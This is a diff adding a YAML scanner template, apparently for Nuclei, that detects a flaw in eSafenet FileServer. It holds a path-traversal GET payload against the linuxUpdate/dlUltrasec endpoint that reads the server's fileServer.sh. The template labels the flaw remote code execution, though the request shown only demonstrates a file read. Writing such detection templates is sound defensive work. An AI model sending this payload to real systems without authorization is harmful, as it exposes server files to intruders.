@@ -1,0 +1,22 @@
+id: esafenet-fileserver-rce
+info:
+  name: eSafenet FileServer RCE
+  author: yuxiang.cai
+  severity: critical
+  description: |
+    Detects Remote Code Execution vulnerability in eSafenet FileServer via a crafted request to the linuxUpdate endpoint.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/linuxUpdate/dlUltrasec?path=../../../../../../../../../esafenet/fileServer/fileServer.sh&type=1"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "fileServer.jar"
+      - type: word
+        part: body
+        words:
+          - "/bin/bash"
